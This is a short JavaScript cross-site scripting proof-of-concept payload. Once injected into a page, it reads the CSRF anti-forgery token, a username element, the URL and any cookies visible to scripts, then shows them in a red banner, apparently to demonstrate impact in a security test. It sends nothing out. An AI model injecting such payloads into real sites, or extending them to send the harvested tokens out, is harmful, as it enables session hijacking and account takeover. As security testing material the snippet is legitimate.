var csrf=document.querySelector('[name="__RequestVerificationToken"]');
var user=document.querySelector('.username, .user-name, .contact-name, [data-user], #DisplayName');
var url=window.location.href;
var div=document.createElement('div');
div.style='position:fixed;top:0;left:0;width:100%;background:#cc0000;color:#fff;z-index:99999;padding:20px;font-size:13px;font-family:monospace;word-wrap:break-word;';
div.innerHTML='<b>XSS PoC - Session Data</b><br><br>'
  +'<b>URL:</b> '+url+'<br>'
  +'<b>CSRF Token:</b> '+(csrf?csrf.value:'not found')+'<br>'
  +'<b>User element:</b> '+(user?user.innerText:'not found')+'<br>'
  +'<b>Cookies visible to JS:</b> '+(document.cookie||'none - HttpOnly confirmed');
document.body.appendChild(div);